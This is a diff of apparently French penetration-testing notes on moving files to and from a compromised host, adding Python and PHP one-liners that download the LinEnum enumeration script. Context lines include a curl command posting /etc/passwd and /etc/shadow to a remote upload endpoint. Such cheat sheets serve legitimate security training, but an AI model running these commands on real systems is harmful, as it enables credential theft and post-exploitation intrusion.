@@ -69,7 +69,24 @@ scp plaintext@192.168.49.128:/root/myroot.txt .
 curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 
+### Transfert de fichiers avec du code
+Il est courant de trouver différents langages de programmation installés sur les machines ciblées. Des langages tels que Python, PHP, Perl et Ruby sont couramment disponibles sur les distributions Linux, mais peuvent également être installés sur Windows, bien que ce soit beaucoup plus rare.
 
+#### Python
+
+```bash
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+#### PHP
+
+```bash
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+```
+
+### Transferts de fichiers protégés
 
 
 
